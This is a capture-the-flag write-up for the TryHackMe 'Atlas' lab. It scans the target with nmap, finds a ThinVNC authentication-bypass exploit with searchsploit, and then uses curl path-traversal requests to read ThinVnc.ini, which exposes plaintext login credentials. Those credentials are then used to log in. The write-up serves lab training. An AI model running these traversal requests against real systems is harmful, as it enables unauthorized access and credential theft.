# Atlas


Type: Guided
Room Link: https://tryhackme.com/room/atlas

## Enumeration

IP: 10.10.208.37

Nmap

```
nmap -p- -v 10.10.208.37 -Pn

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
7680/tcp open  pando-pub
8080/tcp open  http-proxy
```

## Port 8080

ThinVNC

```
searchsploit thinvnc
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
ThinVNC 1.0b1 - Authentication Bypass                                            | windows/remote/47519.py
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

https://redteamzone.com/ThinVNC/

```
curl 'http://10.10.208.37:8080/../../../../../ThinVnc.ini' --proxy 127.0.0.1:8080
curl 'http://10.10.208.37:8080/asd/../../ThinVnc.ini' --path-as-is

[Authentication]
Unicode=0
User=Atlas
Password=H0ldUpTheHe@vens
Type=Digest
[Http]
Port=8080
Enabled=1
[Tcp]
Port=
[General]
AutoStart=1
```

![image](https://user-images.githubusercontent.com/5285547/135341220-4180571f-aea9-4961-81cc-86dfb7caa1de.png)

Now we can login to the service 

![image](https://user-images.githubusercontent.com/5285547/135341483-7dc5da86-1647-4933-9c89-f679a1e70314.png)

```
Atlas:H0ldUpTheHe@vens
```

Connect to localhost pc

![image](https://user-images.githubusercontent.com/5285547/135341603-c419269b-8608-4188-8e47-4bc4e146512b.png)

![image](https://user-images.githubusercontent.com/5285547/135341615-ba41ba22-4a67-44e5-8cf3-216c47055b21.png)

